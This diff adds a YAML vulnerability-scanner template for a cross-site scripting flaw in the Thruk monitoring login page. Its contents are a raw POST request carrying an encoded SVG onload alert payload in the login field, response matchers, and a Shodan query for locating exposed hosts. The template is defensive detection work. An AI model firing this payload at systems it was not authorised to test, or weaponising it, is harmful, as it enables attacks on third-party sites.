@@ -1,0 +1,48 @@
+id: thruk-xss
+
+info:
+  name: Thruk Monitoring Webinterface - Cross-Site Scripting
+  author: pikpikcu,ritikchaddha
+  severity: high
+  description: |
+    Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/cgi-bin/login.cgi.
+  reference:
+    - https://www.thruk.org/download.html
+    - https://www.usd.de/en/security-advisory-thruk-monitoring-v2-46-3
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+    cpe: cpe:2.3:a:thruk:thruk:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"Thruk"
+    product: thruk
+    vendor: thruk
+  tags: thruk,xss
+
+http:
+  - raw:
+      - |
+        POST /thruk/cgi-bin/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<svg/onload=alert(document.domain)>\"@gmail.com') called at"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 500
+# digest: 4b0a00483046022100c1caf558cc3fa1450bc66ec9adc87ed06bd4eab7d0647c292ee0c6666239e9ae0221009abe3802b41435aac40697000393fc5e315ac6a63357b22394c3662d105d346a:922c64590222798bb761d5b6d8e72950
